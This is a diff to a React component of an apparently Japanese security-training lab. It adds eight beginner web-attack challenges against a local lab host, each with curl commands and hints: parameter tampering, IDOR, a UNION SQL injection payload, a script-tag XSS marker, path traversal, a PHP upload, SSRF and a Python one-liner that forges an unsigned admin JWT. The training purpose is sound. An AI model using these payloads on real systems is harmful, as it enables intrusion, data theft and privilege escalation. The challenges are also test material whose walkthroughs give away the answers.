@@ -11,7 +11,7 @@ interface Challenge {
 }
 
 interface ChallengeGroup {
-  id: 1 | 2 | 3 | 4;
+  id: 1 | 2 | 3 | 4 | 5;
   title: string;
   subtitle: string;
   challenges: Challenge[];
@@ -20,9 +20,9 @@ interface ChallengeGroup {
 interface Props {
   onInsertCommand: (command: string) => void;
   resetSignal: number;
-  targetId: 1 | 2 | 3 | 4;
-  onTargetChange: (targetId: 1 | 2 | 3 | 4) => void;
-  scope: 'targets' | 'tools';
+  targetId: 1 | 2 | 3 | 4 | 5;
+  onTargetChange: (targetId: 1 | 2 | 3 | 4 | 5) => void;
+  scope: 'targets' | 'tools' | 'web-attacks';
 }
 
 const challengeGroups: ChallengeGroup[] = [
@@ -200,6 +200,69 @@ const challengeGroups: ChallengeGroup[] = [
       },
     ],
   },
+  {
+    id: 5,
+    title: '問題5',
+    subtitle: 'Web Attacks 初級',
+    challenges: [
+      {
+        id: '01', title: 'Parameter Tampering', answerId: 'web-parameter',
+        goal: 'TBX Marketの商品購入リクエストを観察し、割引率を改変して研修用Flagを取得してください。',
+        commands: ["curl -X POST -d 'product=1&discount=10' http://labtarget:3100/web-attacks/buy", "curl -X POST -d 'product=1&discount=90' http://labtarget:3100/web-attacks/buy"],
+        hint: 'まず1本目で通常購入のレスポンスを確認します。次に、送信される `discount` はブラウザー側のhidden項目にすぎない点に注目してください。Burp Repeaterを使う場合は購入POSTを捕捉し、割引率だけを90へ変更して再送します。Terminalでは2本目のcurlが同じ操作です。成功レスポンス内の `TBX{...}` を回答欄へ入力します。',
+        result: '90%の研修割引が適用され、レスポンスに `TBX{...}` が表示されます。',
+      },
+      {
+        id: '02', title: 'IDOR / Broken Access Control', answerId: 'web-idor',
+        goal: 'プロフィールのユーザーIDを変更し、管理者プロフィールに残された研修用Flagを見つけてください。',
+        commands: ["curl 'http://labtarget:3100/web-attacks/profile?id=1001'", "curl 'http://labtarget:3100/web-attacks/profile?id=1003'"],
+        hint: '最初のコマンドで自分のプロフィールを取得し、URLの `id=1001` が表示対象を決めていることを確認します。連番になっているIDを少しずつ変更して、別ユーザーの情報が認可確認なしで返るか比べます。管理者に相当するプロフィールの研修メモにある `TBX{...}` を回答してください。',
+        result: '管理者プロフィールの研修メモから `TBX{...}` を確認できます。',
+      },
+      {
+        id: '03', title: 'SQL Injection', answerId: 'web-sqli',
+        goal: '商品検索の文字列がSQLへ安全に渡されているか調べ、研修用テーブルからFlagを取得してください。',
+        commands: ["curl -G http://labtarget:3100/web-attacks/search --data-urlencode 'q=apple'", "curl -G http://labtarget:3100/web-attacks/search --data-urlencode \"q=' UNION SELECT id,label,value FROM training_secrets--\""],
+        hint: 'まず通常検索のJSON構造を確認します。次に、検索語の末尾へシングルクォートを入れたときの挙動から、入力がSQL文へ連結されている可能性を考えます。2本目は元のSELECTと同じ3列になるよう `UNION SELECT` を組み、研修専用の `training_secrets` を参照します。結果行のvalueにある `TBX{...}` を回答します。',
+        result: '検索結果JSONに研修用secretの `TBX{...}` が追加されます。',
+      },
+      {
+        id: '04', title: 'Stored XSS（安全な模擬）', answerId: 'web-xss',
+        goal: 'コメントへ研修用マーカーを保存し、安全な模擬検出結果からFlagを取得してください。スクリプトは実行されません。',
+        commands: ["curl -X POST -d 'author=student&comment=通常コメント' http://labtarget:3100/web-attacks/comments", "curl -X POST -d 'author=student' --data-urlencode 'comment=<script>training()</script>' http://labtarget:3100/web-attacks/comments", "curl http://labtarget:3100/web-attacks/comments"],
+        hint: 'まず1本目で通常コメントを投稿し、COMMENTS画面または3本目のcurlで保存後も表示されることを確認します。次に2本目で研修専用のscriptマーカーを投稿し、もう一度COMMENTSを取得します。サーバーは入力をDBへ保存しますが、表示時にはHTMLをエスケープし、JavaScriptを一切実行しません。保存文字列の近くに出る安全な検出通知から `TBX{...}` を探し、回答欄へ入力してください。',
+        result: '入力は文字列として表示され、安全な模擬検出通知に `TBX{...}` が現れます。',
+      },
+      {
+        id: '05', title: 'Path Traversal（仮想ファイル）', answerId: 'web-traversal',
+        goal: 'FILES機能の相対パス処理を調べ、仮想ファイル領域の研修メモを取得してください。実ファイルは読みません。',
+        commands: ["curl 'http://labtarget:3100/web-attacks/files?name=manual.txt'", "curl 'http://labtarget:3100/web-attacks/files?name=../private/training-note.txt'"],
+        hint: 'まず公開ファイル名を指定し、`name` が読み込み対象を決めていることを確認します。次に `../` を使ってpublicの一つ上を表すパスを試します。この演習は辞書で定義した仮想ファイルだけを返すため、OS上のパスには到達しません。研修メモ内の `TBX{...}` を回答します。',
+        result: '仮想のprivate研修メモから `TBX{...}` を確認できます。',
+      },
+      {
+        id: '06', title: 'Unrestricted File Upload（安全な模擬）', answerId: 'web-upload',
+        goal: '許可されるべきでない拡張子のファイルを送り、アップロード検証の不足を確認してください。内容は保存・実行されません。',
+        commands: ["printf 'normal image metadata' > /tmp/profile.txt", "curl -F 'file=@/tmp/profile.txt;type=text/plain' http://labtarget:3100/web-attacks/upload", "printf 'training only' > /tmp/training.php", "curl -F 'file=@/tmp/training.php;type=application/x-php' http://labtarget:3100/web-attacks/upload"],
+        hint: 'まず1本目で通常ファイルを作り、2本目の `curl -F` で送信して、Flagのない保存結果を確認します。次に3本目で内容が無害なまま危険な拡張子を持つ教材ファイルを作ります。4本目はmultipart/form-dataでそのファイル名とContent-Typeを送ります。サーバーは内容を破棄し、名前・種別・サイズだけをメモリDBへ記録します。危険な形式を不適切に受理したJSONから `TBX{...}` を探し、回答してください。',
+        result: 'レスポンスは `executed: false` を示し、検証不足を表す `TBX{...}` を返します。',
+      },
+      {
+        id: '07', title: 'SSRF（通信しない模擬）', answerId: 'web-ssrf',
+        goal: 'URLプレビューへ内部向けURLを指定し、模擬内部ルートのFlagを取得してください。外部通信は行われません。',
+        commands: ["curl -G http://labtarget:3100/web-attacks/preview --data-urlencode 'url=https://market.tbx/products'", "curl -G http://labtarget:3100/web-attacks/preview --data-urlencode 'url=http://internal.tbx/admin'"],
+        hint: '1本目で事前定義された公開URLの模擬結果を確認します。次にホスト名を内部サービス用のものへ変更します。サーバーは入力URLへ接続せず、完全一致する教材ルートだけをローカルの固定レスポンスへ割り当てます。`source` が模擬内部ルートを示すJSON内の `TBX{...}` を回答してください。',
+        result: '外部通信なしで、模擬内部サービスのJSONに `TBX{...}` が表示されます。',
+      },
+      {
+        id: '08', title: 'Broken Authentication / JWT', answerId: 'web-jwt',
+        goal: '署名されていない研修トークンのroleを書き換え、管理者APIへアクセスしてください。',
+        commands: ["curl -X POST -d 'username=student&password=market123' http://labtarget:3100/web-attacks/login", "python3 -c \"import base64,json; t=input('token: ').strip(); p=json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))); p['role']='admin'; print(base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).decode().rstrip('='))\"", "curl -H 'Authorization: Bearer 変更後のトークン' http://labtarget:3100/web-attacks/admin"],
+        hint: '1本目のレスポンスからtokenをコピーします。2本目を実行してtokenを貼り付けると、Base64URLのJSONを復号し、`role` だけをadminへ変えた新しいtokenが表示されます。3本目の日本語部分をその値へ置き換えて送信します。署名検証がないため改変が受理され、管理者レスポンスの `TBX{...}` を取得できます。RESET後はnonceが変わり、古いtokenは無効になります。',
+        result: 'roleを改変した現行トークンで、管理者APIから `TBX{...}` を取得できます。',
+      },
+    ],
+  },
 ];
 
 const STORAGE_KEY = 'terminalbox:challenge-completed';
@@ -213,7 +276,11 @@ function loadCompleted() {
 }
 
 export function ChallengePanel({ onInsertCommand, resetSignal, targetId, onTargetChange, scope }: Props) {
-  const availableGroups = scope === 'tools' ? challengeGroups.filter((item) => item.id === 4) : challengeGroups.filter((item) => item.id !== 4);
+  const availableGroups = scope === 'tools'
+    ? challengeGroups.filter((item) => item.id === 4)
+    : scope === 'web-attacks'
+      ? challengeGroups.filter((item) => item.id === 5)
+      : challengeGroups.filter((item) => item.id <= 3);
   const group = availableGroups.find((item) => item.id === targetId) ?? availableGroups[0];
   const [selectedId, setSelectedId] = useState(group.challenges[0].id);
   const [queuedCommand, setQueuedCommand] = useState<string | null>(null);
@@ -230,7 +297,7 @@ export function ChallengePanel({ onInsertCommand, resetSignal, targetId, onTarge
 
   useEffect(() => window.localStorage.setItem(STORAGE_KEY, JSON.stringify(completedIds)), [completedIds]);
   useEffect(() => { setSelectedId(group.challenges[0].id); setQueuedCommand(null); setAnswer(''); setFeedback(''); }, [group]);
-  useEffect(() => { setSelectedId('01'); setCompletedIds(loadCompleted()); setAnswer(''); setFeedback(''); }, [resetSignal]);
+  useEffect(() => { setSelectedId(group.challenges[0].id); setCompletedIds(loadCompleted()); setAnswer(''); setFeedback(''); }, [group, resetSignal]);
   useEffect(() => setHintVisible(false), [selectedId, resetSignal]);
 
   const queueCommand = (command: string) => {
@@ -269,9 +336,9 @@ export function ChallengePanel({ onInsertCommand, resetSignal, targetId, onTarge
   };
 
   return (
-    <section className="panel tutorial-panel challenge-panel" id="challenge-panel" role="tabpanel" aria-labelledby={scope === 'tools' ? 'tools-tab' : 'targets-tab'}>
+    <section className="panel tutorial-panel challenge-panel" id="challenge-panel" role="tabpanel" aria-labelledby={scope === 'tools' ? 'tools-tab' : scope === 'web-attacks' ? 'web-attacks-tab' : 'targets-tab'}>
       <div className="panel-heading">
-        <div><span className="eyebrow">{scope === 'tools' ? 'SECURITY TOOL MISSIONS' : 'TARGET MISSIONS'}</span><h2>{group.subtitle}</h2></div>
+        <div><span className="eyebrow">{scope === 'tools' ? 'SECURITY TOOL MISSIONS' : scope === 'web-attacks' ? 'WEB ATTACK MISSIONS' : 'TARGET MISSIONS'}</span><h2>{group.subtitle}</h2></div>
         <span className="ai-badge">{groupCompleted}/{group.challenges.length} CLEAR</span>
       </div>
       {scope === 'targets' && <div className="challenge-target-tabs" role="tablist" aria-label="ターゲット問題を選択">
@@ -296,7 +363,7 @@ export function ChallengePanel({ onInsertCommand, resetSignal, targetId, onTarge
           <div className="lesson-title-row">
             <div><span className="eyebrow">{group.title.toUpperCase()} / QUESTION {challenge.id}</span><h3>{challenge.title}</h3></div>
             <div className="lesson-title-status">
-              {scope === 'tools' && <button type="button" className="lesson-clear-button" disabled={!completed} onClick={clearChallenge}>クリア解除</button>}
+              {scope !== 'targets' && <button type="button" className="lesson-clear-button" disabled={!completed} onClick={clearChallenge}>クリア解除</button>}
               <span className={`lesson-clear-badge ${completed ? 'cleared' : ''}`}>{completed ? 'クリア済み' : '未クリア'}</span>
             </div>
           </div>
